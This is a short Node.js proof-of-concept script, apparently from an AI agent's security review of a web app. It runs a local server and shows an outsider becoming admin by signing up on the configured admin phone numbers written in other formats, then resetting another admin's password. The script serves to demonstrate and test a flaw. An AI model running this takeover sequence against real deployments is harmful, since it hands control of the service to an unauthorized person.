// Spawns the real server on 8104 with ADMIN_PHONES (2 numbers) and shows an outsider becoming admin.
const { spawn } = require('child_process');
const P = '/tmp/claude-0/-home-user-DHK-Predicts/40770141-c89f-5d4e-b4c8-6b95cd22e417/scratchpad/04';
require('fs').rmSync(P + '/data.json', { force: true });
const srv = spawn('node', ['server.js'], { cwd: '/home/user/upcoming/dhk-predicts-features/app',
  env: { ...process.env, ADMIN_PHONES: '01711000000,+12125550123', PORT: '8104', DATA_FILE: P + '/data.json' }, stdio: 'ignore' });
const B = 'http://localhost:8104/api/';
const call = async (n, body, tok, m = 'POST', hdr = {}) => { const r = await fetch(B + n + (m === 'GET' ? '?' + new URLSearchParams(body) : ''), { method: m, headers: { 'content-type': 'application/json', ...(tok ? { authorization: 'Bearer ' + tok } : {}), ...hdr }, body: m === 'POST' ? JSON.stringify(body) : undefined }); return [r.status, await r.json()]; };
const su = (phone, name, hdr) => call('auth', { mode: 'signup', phone, pin: 'attackerpw1', name, adult: true, consent: true }, null, 'POST', hdr);
(async () => {
  await new Promise(r => setTimeout(r, 800));
  // Attacker is "in Bangladesh" per Vercel header, no knowledge of the real owner's password.
  let [s, r] = await su('+8801711000000', 'Mallory', { 'x-vercel-ip-country': 'BD' }); console.log('attacker signup admin#1 from BD ip:', s, JSON.stringify(r).slice(0, 40));
  const t1 = r.token; let [, h] = await call('home', {}, t1, 'GET'); console.log(' me.admin =', h.me.admin);
  [s, r] = await su('+12125550123', 'Mallory2', {}); const t2 = r.token; [, h] = await call('home', {}, t2, 'GET'); console.log('attacker signup admin#2:', s, ' me.admin =', h.me.admin);
  [s, r] = await call('inbox', {}, t1, 'GET'); console.log('inbox adminCount (attacker sees):', r.adminCount);
  // Real owner shows up
  [s, r] = await su('01711000000', 'RealAdmin', {}); console.log('real owner signup:', s, JSON.stringify(r));
  // Attacker holds BOTH admin seats: two-admin rule is now two accounts of one person.
  [s, r] = await call('resetpw', { phone: '+8801711000000' }, t2); console.log('attacker admin#2 issues resetpw for admin#1 acct:', s, Object.keys(r));
  // non-admin cannot see adminCount
  [s, r] = await su('+8801812345678', 'Plain', { 'x-vercel-ip-country': 'US' }); const t3 = r.token;
  [s, r] = await call('inbox', {}, t3, 'GET'); console.log('non-admin inbox:', s, JSON.stringify(r));
  [s, r] = await call('home', {}, t3, 'GET'); console.log('non-admin home has adminCount?', 'adminCount' in r);
  srv.kill();
})().catch(e => { console.error(e); srv.kill(); });
